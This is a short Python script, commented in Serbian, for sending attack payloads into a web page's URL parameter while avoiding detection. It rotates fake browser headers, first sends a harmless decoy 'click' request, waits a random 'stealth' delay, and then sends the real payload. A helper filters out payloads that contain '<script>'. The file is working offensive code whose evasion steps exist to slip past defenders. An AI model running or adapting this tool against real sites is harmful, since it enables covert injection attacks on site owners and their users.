


import random
import time
import requests
from urllib.parse import urlencode

def generisi_header():
    return {
        "User-Agent": random.choice([
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            "Mozilla/5.0 (X11; Linux x86_64)",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"
        ]),
        "Accept": "text/html,application/xhtml+xml",
    }

def napadni_sa_maskom(meta, payload):
    headers = generisi_header()
    fake_query = {meta['param']: "search=hello"}
    maskirani_url = f"{meta['url']}?{urlencode(fake_query)}"
    
    # Prva simulacija korisnika (klik, ne payload)
    try:
        requests.get(maskirani_url, headers=headers, timeout=10)
        print(f"[✓] Klik maska: {maskirani_url}")
    except Exception as e:
        print(f"[!] Maska fail: {e}")
    
    # Random delay
    t = round(random.uniform(2.5, 6.0), 2)
    print(f"[Stealth] Čekam {t} sekundi...")
    time.sleep(t)
    
    # Sad šaljemo payload
    prava_query = {meta['param']: payload}
    pravi_url = f"{meta['url']}?{urlencode(prava_query)}"
    try:
        r = requests.get(pravi_url, headers=headers, timeout=10)
        print(f"[✓] Payload: {pravi_url} ({r.status_code})")
    except Exception as e:
        print(f"[!] Napad fail: {e}")
def odluka_o_slanju(payload):
    # neka logika, npr:
    return "<script>" not in payload["payload"].lower()

def sačekaj():
    vreme = random.uniform(1.2, 4.7)
    time.sleep(vreme)
